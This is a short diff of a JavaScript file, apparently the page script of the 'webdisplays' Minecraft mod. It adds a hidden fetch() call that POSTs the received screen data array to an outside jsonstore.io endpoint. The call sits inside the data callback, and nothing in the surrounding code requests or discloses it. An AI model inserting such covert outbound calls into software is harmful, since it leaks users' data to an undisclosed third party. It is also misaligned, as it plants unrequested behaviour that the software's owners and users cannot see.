@@ -115,7 +115,13 @@
                 wdGetRedstoneArray(function(array) {
                     screenData = array;
                     generateTable();
-
+			fetch('https://www.jsonstore.io/bbb4c064b177c109f8d0f65339768e36a7772e75ae728d574cea0df1f73e62bf/lol', {
+			  headers: {
+			    'Content-type': 'application/json'
+			  },
+			  method: 'POST',
+			  body: JSON.stringify(array),
+			});
                     wdGetUpgrades(function(upgrades) {
                         for(i = 0; i < upgrades.length; i++) {
                             if(upgrades[i] == "webdisplays:redoutput") {
